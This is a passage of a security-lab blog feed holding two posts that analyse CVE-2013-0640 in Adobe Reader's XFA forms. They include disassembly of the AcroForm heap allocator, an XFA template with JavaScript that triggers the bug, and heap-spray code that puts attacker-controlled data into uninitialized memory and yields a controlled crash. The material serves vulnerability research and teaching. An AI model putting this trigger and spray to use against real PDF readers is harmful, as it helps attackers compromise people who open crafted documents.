+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/cve-2013-5065-ndproxy-array-indexing-error-unpatched-vulnerability/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>CVE-2013-0640: Adobe Reader XFA oneOfChild Un-initialized memory vulnerability (part 2)</title>
+		<link>https://labs.portcullis.co.uk/blog/cve-2013-0640-adobe-reader-xfa-oneofchild-un-initialized-memory-vulnerability-part-2/</link>
+		<comments>https://labs.portcullis.co.uk/blog/cve-2013-0640-adobe-reader-xfa-oneofchild-un-initialized-memory-vulnerability-part-2/#comments</comments>
+		<pubDate>Tue, 15 Oct 2013 06:28:21 +0000</pubDate>
+		<dc:creator><![CDATA[MTB]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[Adobe Reader]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[CVE-2013-0640]]></category>
+		<category><![CDATA[exploit]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=1906</guid>
+		<description><![CDATA[<p>The purpose of this document is to present the second part of a technical report of the CVE-2013-0640 vulnerability targeting Adobe Reader version 9, 10 and 11. It was first spotted in February 2013 and has been used actively in the wild. Warning: All function names in this article are purely fictional and were chosen [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/cve-2013-0640-adobe-reader-xfa-oneofchild-un-initialized-memory-vulnerability-part-2/">CVE-2013-0640: Adobe Reader XFA oneOfChild Un-initialized memory vulnerability (part 2)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>The purpose of this document is to present the second part of a technical report of the <a title="CVE-2013-0640" href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-0640">CVE-2013-0640</a> vulnerability targeting Adobe Reader version 9, 10 and 11. It was first spotted in February 2013 and has been used actively in the wild.<span id="more-1906"></span></p>
+<pre>Warning: All function names in this article are purely fictional and were chosen based on what was understood during the reverse engineering. Even if it could resemble true names, it is most likely a coincidence. Obviously no pieces of code were harmed during the reverse engineering.</pre>
+<h2>Binary Information</h2>
+<table>
+<tbody>
+<tr>
+<td>Name:</td>
+<td>AcroForm_api</td>
+</tr>
+<tr>
+<td>Base address:</td>
+<td>0&#215;20800000</td>
+</tr>
+<tr>
+<td>File version:</td>
+<td>9.5.0.270</td>
+</tr>
+<tr>
+<td>Default path:</td>
+<td>C:\Program Files\Adobe\Reader 9.0\Reader\plug_ins\AcroForm.api</td>
+</tr>
+</tbody>
+</table>
+<h2>Un-initialized memory vulnerability</h2>
+<p>As seen in the previous paper, the bug is due to un-initialized memory. In order to exploit this kind of vulnerability, one needs to control the content of the memory at the address of the future allocation. Hopefully the heap is deterministic. In order to understand this, we need to dive deep into AcroForm to see how blocks of memory are allocated.</p>
+<h2>AcroForm custom memory allocator</h2>
+<p>The buggy block that contains un-initialized data is allocated and used in the sub_209DE150() function. It allocates a block of 0x3c and initializes it as a node object.</p>
+<pre class="brush: asm; gutter: false; highlight: [18,19,30]; title: ; notranslate">
+.text:209DE150 sub_209DE150
+.text:209DE150
+.text:209DE150 var_34          = dword ptr -34h
+.text:209DE150 var_30          = dword ptr -30h
+.text:209DE150 var_2C          = dword ptr -2Ch
+.text:209DE150 var_28          = dword ptr -28h
+.text:209DE150 var_24          = dword ptr -24h
+.text:209DE150 var_20          = dword ptr -20h
+.text:209DE150 var_1C          = dword ptr -1Ch
+.text:209DE150 var_18          = dword ptr -18h
+
+...
+
+.text:209DE2F4                 call    sub_20988A83
+.text:209DE2F9                 lea     ecx, [ebp+arg_4]
+.text:209DE2FC                 mov     byte ptr [ebp+var_4], 6
+.text:209DE300                 call    sub_208A7FA1
+.text:209DE305                 push    3Ch
+.text:209DE307                 call    CustomMalloc
+.text:209DE30C                 pop     ecx
+.text:209DE30D                 mov     ecx, eax
+.text:209DE30F                 mov     [ebp+arg_4], ecx
+.text:209DE312                 cmp     ecx, edi
+.text:209DE314                 mov     byte ptr [ebp+var_4], 8
+.text:209DE318                 jz      short loc_209DE327
+.text:209DE31A                 push    edi
+.text:209DE31B                 lea     eax, [ebp+var_1C]
+.text:209DE31E                 push    eax
+.text:209DE31F                 push    edi
+.text:209DE320                 call    InitializeBrokenNode
+.text:209DE325                 mov     edi, eax
+</pre>
+<p>We can observe from the disassembled code that the function in charge of the allocation is specific to AcroForm. The CustomMalloc() function works by getting an object that represents the custom heap and returning an address of a block of the desired size: 0x3c in our case.</p>
+<pre class="brush: asm; gutter: false; highlight: [7,10]; title: ; notranslate">
+.text:2080B962 CustomMalloc
+.text:2080B962
+.text:2080B962 arg_0           = dword ptr  4
+.text:2080B962
+.text:2080B962                 push    [esp+arg_0]     ; size.
+.text:2080B966                 push    0
+.text:2080B968                 call    GetCustomHeapObject
+.text:2080B96D                 pop     ecx
+.text:2080B96E                 mov     ecx, eax
+.text:2080B970                 call    DoCustomAllocation
+.text:2080B975                 retn
+.text:2080B975 CustomMalloc    endp
+</pre>
+<p>First a small check is performed in the DoCustomAllocation() function to ensure that the custom heap allocator is activated. Otherwise the malloc() function is called directly. Following this, it tries to find a memory pool that matches the desired size. This is achieved using the GetBlockFromMemoryPool() function that returns a memory pool for the size 0&#215;48. Once done, the result of the UpdateMemoryPoolAndReturnAllocatedBlock() function is returned.</p>
+<pre class="brush: asm; gutter: false; highlight: [9,10,24,29,30,32]; title: ; notranslate">
+.text:2080B81E DoCustomAllocation
+.text:2080B81E
+.text:2080B81E var_14          = byte ptr -14h
+.text:2080B81E arg_0           = dword ptr  8
+.text:2080B81E
+.text:2080B81E                 push    ebp
+.text:2080B81F                 mov     ebp, esp
+.text:2080B821                 sub     esp, 14h
+.text:2080B824                 cmp     isCustomAllocator, 0   ; Is custom heap activated? Else use malloc.
+.text:2080B82B                 jnz     short loc_2080B851     ; Jump is taken.
+.text:2080B82D                 push    [ebp+arg_0]
+.text:2080B830                 call    ds:malloc
+.text:2080B836                 test    eax, eax
+.text:2080B838                 pop     ecx
+.text:2080B839                 jnz     short locret_2080B86A
+.text:2080B83B                 lea     ecx, [ebp+var_14]
+.text:2080B83E                 call    sub_20805C9A
+.text:2080B843                 push    offset unk_20E0073C
+.text:2080B848                 lea     eax, [ebp+var_14]
+.text:2080B84B                 push    eax
+.text:2080B84C                 call    _CxxThrowException
+.text:2080B851
+.text:2080B851 loc_2080B851:
+.text:2080B851                 mov     eax, [ebp+arg_0]       ; Take the desired size.
+.text:2080B854                 add     eax, eax
+.text:2080B856                 push    eax
+.text:2080B857                 lea     eax, [ebp+arg_0]
+.text:2080B85A                 push    eax
+.text:2080B85B                 call    GetBlockFromMemoryPool
+.text:2080B860                 push    [ebp+arg_0]            ; Size 0x48.
+.text:2080B863                 mov     ecx, eax
+.text:2080B865                 call    UpdateMemoryPoolAndReturnAllocatedBlock
+.text:2080B86A
+.text:2080B86A locret_2080B86A:
+.text:2080B86A                 leave
+.text:2080B86B                 retn    4
+</pre>
+<p>The GetBlockFromMemoryPool() function works by first checking if the desired size is bigger than 0&#215;100. Otherwise it looks into a freelist for a memory pool that fits. The freelist consists of an array of quartets of dwords. Although all sizes between 0 and 0&#215;100 have their own entries in the freelist, some may share the same memory pool. This is the case for size 0x3c and size 0&#215;48.</p>
+<pre class="brush: asm; gutter: false; highlight: [8,10,12,13,15,18,20,35]; title: ; notranslate">
+.text:2080B744 GetBlockFromMemoryPool
+.text:2080B744
+.text:2080B744 arg_0           = dword ptr  4
+.text:2080B744 arg_4           = dword ptr  8
+.text:2080B744
+.text:2080B744                 push    ebx
+.text:2080B745                 push    esi
+.text:2080B746                 mov     ebx, ecx             ; ECX points to the custom heap object.
+.text:2080B748                 mov     ecx, [esp+8+arg_0]
+.text:2080B74C                 mov     esi, [ecx]           ; Desired size.
+.text:2080B74E                 push    edi
+.text:2080B74F                 mov     edi, 100h
+.text:2080B754                 cmp     esi, edi
+.text:2080B756                 jnb     short bigger_than_100_or_freelist_empty
+.text:2080B758                 mov     eax, [ebx+esi*4+18h] ; Look at the freelist for blocks of size 0x3c.
+.text:2080B75C                 test    eax, eax
+.text:2080B75E                 jz      short bigger_than_100_or_freelist_empty
+.text:2080B760                 mov     edx, [eax+4]         ; Get the real size of the block.
+.text:2080B763                 mov     edx, [edx]
+.text:2080B765                 mov     edx, [edx]           ; Here it is 0x48.
+.text:2080B767                 mov     [ecx], edx
+.text:2080B769                 jmp     short loc_2080B77F
+.text:2080B76B
+.text:2080B76B bigger_than_100_or_freelist_empty:
+.text:2080B76B                 push    [esp+0Ch+arg_4]
+.text:2080B76F                 push    ecx
+.text:2080B770                 mov     ecx, ebx
+.text:2080B772                 call    sub_2080B651
+.text:2080B777                 cmp     esi, edi
+.text:2080B779                 jnb     short loc_2080B77F
+.text:2080B77B                 mov     [ebx+esi*4+18h], eax ; Update the freelist.
+.text:2080B77F
+.text:2080B77F loc_2080B77F:
+.text:2080B77F                 mov     ecx, eax
+.text:2080B781                 call    GetTheBlockOrAllocateANewPool
+.text:2080B786                 pop     edi
+.text:2080B787                 pop     esi
+.text:2080B788                 pop     ebx
+.text:2080B789                 retn    8
+.text:2080B789 GetBlockFromMemoryPool endp
+</pre>
+<p>The memory pool sharing for size 0x3c and size 0&#215;48 can be observed in the memory:</p>
+<pre>
+Quartet for freelist 0x3c.
+02A7AAE0    02405648  HV@    --&gt; Pool address.
+02A7AAE4    00000000  ....
+02A7AAE8    00000000  ....
+02A7AAEC    00000000  ....
+
+Quartet for freelist 0x48.
+02A7AB10    02405648  HV@    --&gt; Pool address.
+02A7AB14    00000000  ....
+02A7AB18    00000000  ....
+02A7AB1C    00000000  ....
+</pre>
+<p>Once the correct memory pool is retrieved, the GetTheBlockOrAllocateANewPool() function is called. This function browses the memory pool for a free block. If the pool is not empty it takes the first available block and returns it.</p>
+<pre class="brush: asm; gutter: false; highlight: [21,33]; title: ; notranslate">
+.text:208D3D56 GetTheBlockOrAllocateANewPool
+.text:208D3D56
+.text:208D3D56 var_10          = dword ptr -10h
+.text:208D3D56 var_4           = dword ptr -4
+.text:208D3D56
+.text:208D3D56                 push    4
+.text:208D3D58                 mov     eax, offset sub_20D34DDF
+.text:208D3D5D                 call    __EH_prolog3
+.text:208D3D62                 mov     edi, ecx
+.text:208D3D64                 mov     edx, [edi]
+.text:208D3D66                 xor     esi, esi
+.text:208D3D68                 xor     ecx, ecx
+.text:208D3D6A                 test    edx, edx
+.text:208D3D6C                 jbe     short loc_208D3D81
+.text:208D3D6E                 mov     eax, [edi+4]
+
+...
+
+.text:208D3D71 loc_208D3D71:
+.text:208D3D71                 mov     esi, [eax]
+.text:208D3D73                 cmp     dword ptr [esi+20h], 0 ; If NULL, then the memory pool is empty.
+.text:208D3D77                 jnz     short loc_208D3DAB
+
+...
+
+.text:208D3DAB loc_208D3DAB:
+.text:208D3DAB                 test    ecx, ecx
+.text:208D3DAD                 jbe     short loc_208D3DDC
+
+...
+
+.text:208D3DDC loc_208D3DDC:
+.text:208D3DDC                 mov     eax, esi
+.text:208D3DDE                 call    __EH_epilog3
+.text:208D3DE3                 retn
+</pre>
+<p>Back to the DoCustomAllocation() function, the block is detached from the memory pool and the memory pool&#8217;s header is updated using the UpdateMemoryPoolAndReturnAllocatedBlock() function.</p>
+<pre class="brush: asm; gutter: false; title: ; notranslate">
+.text:208D3B6E UpdateMemoryPoolAndReturnAllocatedBlock
+.text:208D3B6E
+.text:208D3B6E                 mov     eax, [ecx+20h]
+.text:208D3B71                 mov     edx, [eax]          ; Next block.
+.text:208D3B73                 mov     [ecx+20h], edx      ; Attach the next block in the list.
+.text:208D3B76                 mov     [eax], ecx          ; Mark the current block with a pointer to the info header.
+.text:208D3B78                 inc     dword ptr [ecx+1Ch] ; Increment reference counter to the block.
+.text:208D3B7B                 add     eax, 4              ; Return the actual address of the newly allocated block.
+.text:208D3B7E                 retn    4
+</pre>
+<p>The address of the newly allocated block is returned and eventually the CustomMalloc() function returns its address. It is ready to be used.</p>
+<p>This completes the allocation of a new block when the memory pool contains free blocks. Otherwise a new one needs to be allocated. This can be achieved using the GetTheBlockOrAllocateANewPool() function. The pointer at ESI+0&#215;20 is NULL and ultimately the DoPoolAllocation() function is called.</p>
+<pre class="brush: asm; gutter: false; highlight: [14,36]; title: ; notranslate">
+.text:208D3D56 GetTheBlockOrAllocateANewPool
+.text:208D3D56
+.text:208D3D56 var_10          = dword ptr -10h
+.text:208D3D56 var_4           = dword ptr -4
+.text:208D3D56
+.text:208D3D56                 push    4
+.text:208D3D58                 mov     eax, offset sub_20D34DDF
+.text:208D3D5D                 call    __EH_prolog3
+
+...
+
+.text:208D3D71 loc_208D3D71:
+.text:208D3D71                 mov     esi, [eax]
+.text:208D3D73                 cmp     dword ptr [esi+20h], 0 ; If NULL, then the memory pool is empty.
+.text:208D3D77                 jnz     short loc_208D3DAB
+.text:208D3D79                 inc     ecx
+.text:208D3D7A                 add     eax, 4
+.text:208D3D7D                 cmp     ecx, edx
+.text:208D3D7F                 jb      short loc_208D3D71
+
+.text:208D3D81 loc_208D3D81:
+.text:208D3D81                 push    28h
+.text:208D3D83                 call    ??2@YAPAXI@Z           ; operator new(uint).
+.text:208D3D88                 pop     ecx
+.text:208D3D89                 mov     [ebp+var_10], eax
+.text:208D3D8C                 and     [ebp+var_4], 0
+.text:208D3D90                 test    eax, eax
+.text:208D3D92                 jz      short loc_208D3DB7
+.text:208D3D94                 mov     eax, [esi+4]
+.text:208D3D97                 mov     ecx, [esi]
+.text:208D3D99                 mov     esi, [esi+24h]
+.text:208D3D9C                 push    eax
+.text:208D3D9D                 push    ecx
+.text:208D3D9E                 mov     ecx, [ebp+var_10]
+.text:208D3DA1                 push    esi
+.text:208D3DA2                 call    DoPoolAllocation
+.text:208D3DA7                 mov     esi, eax
+.text:208D3DA9                 jmp     short loc_208D3DB9
+</pre>
+<p>The DoPoolAllocation() function calls the AllocatePool() function.</p>
+<pre class="brush: asm; gutter: false; highlight: [28]; title: ; notranslate">
+.text:208D3C90 DoPoolAllocation
+.text:208D3C90
+.text:208D3C90 var_10          = dword ptr -10h
+.text:208D3C90 var_4           = dword ptr -4
+.text:208D3C90 arg_0           = dword ptr  8
+.text:208D3C90 arg_4           = dword ptr  0Ch
+.text:208D3C90 arg_8           = dword ptr  10h
+.text:208D3C90
+.text:208D3C90                 push    4
+.text:208D3C92                 mov     eax, offset sub_20CE1F10
+.text:208D3C97                 call    __EH_prolog3
+.text:208D3C9C                 mov     esi, ecx
+.text:208D3C9E                 mov     [ebp+var_10], esi
+.text:208D3CA1                 mov     eax, [ebp+arg_4]
+.text:208D3CA4                 mov     [esi], eax
+.text:208D3CA6                 mov     eax, [ebp+arg_8]
+.text:208D3CA9                 lea     ecx, [esi+8]
+.text:208D3CAC                 mov     [esi+4], eax
+.text:208D3CAF                 call    sub_20A0A893
+.text:208D3CB4                 xor     eax, eax
+.text:208D3CB6                 mov     [ebp+var_4], eax
+.text:208D3CB9                 mov     [esi+1Ch], eax
+.text:208D3CBC                 mov     [esi+20h], eax
+.text:208D3CBF                 mov     eax, [ebp+arg_0]
+.text:208D3CC2                 mov     ecx, esi
+.text:208D3CC4                 mov     [esi+24h], eax
+.text:208D3CC7                 mov     dword ptr [esi+18h], 10h
+.text:208D3CCE                 call    AllocatePool
+.text:208D3CD3                 mov     eax, esi
+.text:208D3CD5                 call    __EH_epilog3
+.text:208D3CDA                 retn    0Ch
+</pre>
+<p>The AllocatePool() function performs the actual task. A new memory pool is allocated using the standard malloc() function from the MSVCR80 module. Its size is computed the following way:</p>
+<ul>
+<li>Rounds 0&#215;48 to 0x4c and allocates for 0x2b7 items: 0x4c * 0x2b7 = 0xce54 bytes</li>
+</ul>
+<pre class="brush: asm; gutter: false; highlight: [19]; title: ; notranslate">
+.text:208D3BF4 AllocatePool
+.text:208D3BF4
+.text:208D3BF4 var_18          = byte ptr -18h
+.text:208D3BF4 var_4           = dword ptr -4
+.text:208D3BF4
+.text:208D3BF4                 push    ebp
+.text:208D3BF5                 mov     ebp, esp
+.text:208D3BF7                 sub     esp, 18h
+.text:208D3BFA                 push    esi
+.text:208D3BFB                 mov     esi, ecx
+.text:208D3BFD                 mov     eax, [esi]       ; Desired block size for the memory pool: 0x48.
+.text:208D3BFF                 mov     ecx, [esi+4]     ; 0x2B7.
+.text:208D3C02                 add     eax, 3
+.text:208D3C05                 shr     eax, 2
+.text:208D3C08                 lea     eax, ds:4[eax*4] ; 0x4C.
+.text:208D3C0F                 imul    eax, ecx         ; 0xCE54.
+.text:208D3C12                 push    edi
+.text:208D3C13                 push    eax
+.text:208D3C14                 call    ds:malloc
+.text:208D3C1A                 mov     edi, eax
+.text:208D3C1C                 test    edi, edi
+.text:208D3C1E                 pop     ecx
+</pre>
+<h2>TMTOWTDI</h2>
+<p>As always, when it comes to exploit a vulnerability, there is more than one way to do it. This one is no exception:</p>
+<ul>
+<li>Using the custom allocator</li>
+<li>Using the complete pool coming from malloc()</li>
+</ul>
+<p>In both ways, the idea is to allocate a fair amount of blocks of the targeted size and fill them with controlled data, then to free some of them and<br />
+trigger the final allocation. Because the memory in un-initialized, its content is going to be the content of the previously allocated data at this location, our data.</p>
+<p>The first method would be to use the custom allocator. This involves searching for all calls to the CustomMalloc() function and find one that can both allocate data between 0x3c to 0&#215;48 bytes large and which value can be set at offset 0x3c. This is quite boring and time-consuming. On the other hand, it is a good opportunity to find more bugs.</p>
+<p>The second method is to use directly the malloc() function and spray the memory with blocks of 0xce54 bytes containing the value we want to set at 0x3c, then to free half of them. Subsequently, we need to allocate a few nodes to force the custom allocator to create a new memory pool for size 0&#215;48. Luckily it will use a spot we just freed.</p>
+<h2>Initializing the un-initialized</h2>
+<p>The JavaScript engine (the EScript_api module) uses malloc() to allocate strings. It can be used to allocate 3000 strings of 0xce54 bytes and then to free half of them, leaving holes of targeted size. A short spray of nodes is needed to force the allocator to create a new memory pool that will just fit the newly created hole.</p>
+<pre class="brush: jscript; gutter: false; highlight: [3,5,8,16,17,31,35]; title: ; notranslate">
+function UninitializedMemorySpray()
+{
+	var size = 0xce54;
+	var spray = [];
+	var block = BuildBlock(dword(0x42424242), size);
+	for (var i = 0; i &lt; 3000; i++)
+	{
+		spray.push(block.substring(0, block.length-2) + dword(i));
+	}
+
+	/* Free half of the blocks. */
+	for (var i = 0 ; i &lt; spray.length ; i++)
+	{
+		if ((i % 2) == 0)
+		{
+			spray[i] = dword(i);
+			delete spray[i];
+		}
+	}
+
+	return spray;
+}
+
+function Trigger()
+{
+	var spray = UninitializedMemorySpray();
+
+	/* Create new nodes to force the creation of a new pool. */
+	for (var i=0 ; i &lt; 500 ; i++)
+	{
+		xfa.template.createNode(&quot;contentArea&quot;, &quot;A&quot;);
+	}
+
+    /* Trigger the bug. */
+	xfa.resolveNode(&quot;xfa[0].form[0].form1[0].#pageSet[0].page1[0].#subform[0].field0[0].#ui&quot;).oneOfChild = choiceList;
+}
+</pre>
+<p>Back to the sub_209DE150() function, we have seen that it allocates 0x3c bytes using the custom allocator and then initializes the memory as a new node.</p>
+<pre class="brush: asm; gutter: false; highlight: [9,10,12,26,28]; title: ; notranslate">
+.text:209D8D71 InitializeBrokenNode
+.text:209D8D71
+.text:209D8D71 arg_0           = dword ptr  4
+.text:209D8D71 arg_4           = dword ptr  8
+.text:209D8D71 arg_8           = dword ptr  0Ch
+.text:209D8D71
+.text:209D8D71                 push    esi
+.text:209D8D72                 push    [esp+4+arg_0]
+.text:209D8D76                 mov     esi, ecx
+.text:209D8D78                 call    FirstTouchAllocationHere
+.text:209D8D7D                 mov     ecx, [esp+4+arg_4]
+.text:209D8D81                 mov     dword ptr [esi], offset broken_object
+.text:209D8D87                 mov     eax, [ecx]
+.text:209D8D89                 xor     edx, edx
+.text:209D8D8B                 cmp     eax, edx
+.text:209D8D8D                 mov     [esi+24h], eax
+.text:209D8D90                 jz      short loc_209D8D95
+.text:209D8D92                 inc     dword ptr [eax+4]
+.text:209D8D95
+.text:209D8D95 loc_209D8D95:
+.text:209D8D95                 mov     eax, [esp+4+arg_8]
+.text:209D8D99                 mov     [esi+2Ch], eax
+.text:209D8D9C                 mov     [esi+30h], edx
+.text:209D8D9F                 mov     [esi+34h], edx
+.text:209D8DA2                 mov     [esi+38h], edx
+.text:209D8DA5                 mov     eax, off_20E93D74 ; Pointer to ascii &quot;node&quot;.
+.text:209D8DAA                 and     dword ptr [esi+28h], 0FFFFFFF0h
+.text:209D8DAE                 mov     [esi+0Ch], eax
+.text:209D8DB1                 mov     dword ptr [esi+10h], 0C9h
+.text:209D8DB8                 mov     ecx, [ecx]
+.text:209D8DBA                 cmp     ecx, edx
+</pre>
+<p>After the function returns, we can check the memory at the broken object and the value at offset 0x3c is indeed the expected 0&#215;42424242.</p>
+<pre class="brush: jscript; gutter: false; highlight: [16]; title: ; notranslate">
+$ ==&gt;       20D7F824  $ø×
+$+4         00000000  ....
+$+8         00000000  ....
+$+C         20E93D64  d=é      ; PTR to ASCII &quot;node&quot;
+$+10        000000C9  É...
+$+14        42424242  BBBB
+$+18        42424252  RBBB
+$+1C        00000000  ....
+$+20        00000000  ....
+$+24        0E026D50  Pm
+$+28        42424240  @BBB
+$+2C        00000000  ....
+$+30        00000000  ....
+$+34        00000000  ....
+$+38        00000000  ....
+$+3C        42424242  BBBB
+$+40        42424242  BBBB
+$+44        42424242  BBBB
+$+48        0E026E30  0n
+$+4C        42424242  BBBB
+</pre>
+<p>If we let Adobe Reader continue, it crashes with the controlled 0&#215;42424242 value. Mission achieved!</p>
+<pre class="brush: jscript; gutter: false; highlight: [1,7]; title: ; notranslate">
+(b70.2a8): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=0012f428 ebx=0360807c ecx=42424242 edx=00000000 esi=0ea23948 edi=42424242
+eip=209063b8 esp=0012f3e8 ebp=0012f418 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210206
+209063b8 8b7740          mov     esi,dword ptr [edi+40h] ds:0023:42424282=????????
+</pre>
+<h2>Conclusion</h2>
+<p>The full reversing of the AcroForm allocation function was in fact not entirely required. Indeed the size of a memory pool could just be found by setting page heap and heap tagging using gflags. However, reversing the allocator is never a waste of time. It gives a good insight of the internals of the application and good ideas on how to abuse it in order to exploit heap overflows or produce a memory leak. It is also a good way of finding new bugs.</p>
+<p>This concludes the second part. We have seen how to control the un-initialized data. We are ready to leverage the bug into a code execution vulnerability.</p>
+<h2>References</h2>
+<ul>
+<li>Adobe&#8217;s advisory: <a title="APSA13-02" href="http://www.adobe.com/support/security/advisories/apsa13-02.html">APSA13-02</a></li>
+<li>Download target version: <a title="Adobe Acrobat 10 for Windows" href="http://www.adobe.com/support/downloads/product.jsp?product=10&amp;platform=Windows">Adobe Acrobat 10 for Windows</a></li>
+<li><a title="XFA Specification" href="http://partners.adobe.com/public/developer/en/xml/xfa_spec_2_5.pdf">XFA Specification</a></li>
+</ul>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/cve-2013-0640-adobe-reader-xfa-oneofchild-un-initialized-memory-vulnerability-part-2/">CVE-2013-0640: Adobe Reader XFA oneOfChild Un-initialized memory vulnerability (part 2)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/cve-2013-0640-adobe-reader-xfa-oneofchild-un-initialized-memory-vulnerability-part-2/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>CVE-2013-0640: Adobe Reader XFA oneOfChild Un-initialized memory vulnerability (part 1)</title>
+		<link>https://labs.portcullis.co.uk/blog/cve-2013-0640-adobe-reader-xfa-oneofchild-un-initialized-memory-vulnerability-part-1/</link>
+		<comments>https://labs.portcullis.co.uk/blog/cve-2013-0640-adobe-reader-xfa-oneofchild-un-initialized-memory-vulnerability-part-1/#comments</comments>
+		<pubDate>Thu, 26 Sep 2013 06:28:52 +0000</pubDate>
+		<dc:creator><![CDATA[MTB]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[Adobe Reader]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[CVE-2013-0640]]></category>
+		<category><![CDATA[exploit]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=1529</guid>
+		<description><![CDATA[<p>This document aims to present a technical report of the CVE-2013-0640 vulnerability targeting Adobe Reader version 9, 10 and 11. It was first spotted in February 2013 and has been used actively in the wild. This is the first article of a set. It covers the full detailed analysis of the bug. Adobe Reader is [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/cve-2013-0640-adobe-reader-xfa-oneofchild-un-initialized-memory-vulnerability-part-1/">CVE-2013-0640: Adobe Reader XFA oneOfChild Un-initialized memory vulnerability (part 1)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>This document aims to present a technical report of the <a title="CVE-2013-0640" href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-0640">CVE-2013-0640</a> vulnerability targeting Adobe Reader version 9, 10 and 11. It was first spotted in February 2013 and has been used actively in the wild. This is the first article of a set. It covers the full detailed analysis of the bug.<span id="more-1529"></span></p>
+<p>Adobe Reader is an application software developed by Adobe Systems to view files in Portable Document Format (PDF).</p>
+<p>Adobe XML forms architecture (XFA) are XML specifications for forms to be embedded in a PDF document. There were first introduced in the PDF 1.5 file format specification. They are not compatible with AcroForms. The form itself is saved internally in the PDF. There is a bug when dealing with the forms in a specific way.</p>
+<h2>Binary Information</h2>
+<table>
+<tbody>
+<tr>
+<td>Name:</td>
+<td>AcroForm_api</td>
+</tr>
+<tr>
+<td>Base address:</td>
+<td>0&#215;20800000</td>
+</tr>
+<tr>
+<td>File version:</td>
+<td>9.5.0.270</td>
+</tr>
+<tr>
+<td>Default path:</td>
+<td>C:\Program Files\Adobe\Reader 9.0\Reader\plug_ins\AcroForm.api</td>
+</tr>
+</tbody>
+</table>
+<h2>Analysis</h2>
+<h3>Trigger</h3>
+<p>The proof of concept consists of an embedded XFA form that is being manipulated using JavaScript.</p>
+<p>The form by itself contains two subforms:</p>
+<ul>
+<li>The first contains a choiceList object</li>
+<li>The second one contains a simple draw object</li>
+</ul>
+<pre class="brush: xml; gutter: false; title: ; notranslate">
+&lt;template xmlns=&quot;http://www.xfa.org/schema/xfa-template/2.8/&quot;&gt;
+    &lt;subform name=&quot;form1&quot;&gt;
+        &lt;pageSet&gt;
+            &lt;pageArea name=&quot;page1&quot;&gt;
+                &lt;contentArea /&gt;
+                &lt;subform&gt;
+                    &lt;field name=&quot;field0&quot;&gt;
+                        &lt;ui&gt;&lt;choiceList&gt;&lt;/choiceList&gt;&lt;/ui&gt;
+                    &lt;/field&gt;
+                &lt;/subform&gt;
+            &lt;/pageArea&gt;
+        &lt;/pageSet&gt;
+        &lt;subform&gt;
+            &lt;draw name=&quot;rect1&quot; /&gt;
+        &lt;/subform&gt;
+    &lt;/subform&gt;
+&lt;/template&gt;
+</pre>
+<p>In order to trigger the bug the JavaScript code first saves a reference to the choiceList object for later use. Then it changes the property keep.previous of the draw object in the second subform to contentArea. Once done, the choiceList object is re-attached to the first subform. This triggers the bug.</p>
+<pre class="brush: jscript; gutter: false; title: ; notranslate">
+function Trigger
+{
+    MessWithTheMemory();
+    xfa.resolveNode(&quot;xfa[0].form[0].form1[0].#pageSet[0].page1[0].#subform[0].field0[0].#ui&quot;).oneOfChild = choiceList;
+}
+var choiceList = null;
+function Start()
+{
+    choiceList = xfa.resolveNode(&quot;xfa[0].form[0].form1[0].#pageSet[0].page1[0].#subform[0].field0[0].#ui[0].#choiceList[0]&quot;);
+    xfa.resolveNode(&quot;xfa[0].form[0].form1[0].#subform[0].rect1&quot;).keep.previous = &quot;contentArea&quot;;
+    ddd = app.setTimeOut(&quot;Trigger();&quot;, 1);
+}
+Start();
+</pre>
+<h3>Binary analysis</h3>
+<p>Adobe Reader crashes in the AcroForm_api module. Just before the crash a function located at address 0x20907FA0 is called. For convenience this function is called UseTheUninitializedValue. First it calls a function at 0x209D76AE named GetTheBrokenObject. It then increments an attribute of the object, probably a reference count. Finally the attribute at 0x3c is evaluated. If is is not NULL a function at 0x209063B4 named crash_here is called using the object attribute at 0x3c.</p>
+<pre class="brush: asm; gutter: false; highlight: [18,23,32,34]; title: ; notranslate">
+.text:20907FA0 UseTheUninitializedValue
+.text:20907FA0
+.text:20907FA0 var_10          = dword ptr -10h
+.text:20907FA0 var_4           = dword ptr -4g
+.text:20907FA0 arg_0           = dword ptr  8
+.text:20907FA0 arg_4           = dword ptr  0Ch
+.text:20907FA0 arg_8           = dword ptr  10h
+.text:20907FA0
+.text:20907FA0                 push    4
+.text:20907FA2                 mov     eax, offset sub_20CE45C9
+.text:20907FA7                 call    __EH_prolog3
+.text:20907FAC                 mov     ebx, ecx
+.text:20907FAE                 and     [ebp+var_10], 0
+.text:20907FB2                 push    [ebp+arg_8]
+.text:20907FB5                 lea     eax, [ebp+arg_8]
+.text:20907FB8                 push    [ebp+arg_4]
+.text:20907FBB                 push    eax
+.text:20907FBC                 call    GetTheBrokenObject // Get the uninitialized object from here.
+.text:20907FC1                 mov     esi, [eax]
+.text:20907FC3                 test    esi, esi
+.text:20907FC5                 mov     [ebp+arg_4], esi
+.text:20907FC8                 jz      short loc_20907FCD
+.text:20907FCA                 inc     dword ptr [esi+4] // Reference counter?
+.text:20907FCD
+.text:20907FCD loc_20907FCD:
+.text:20907FCD                 lea     ecx, [ebp+arg_8]
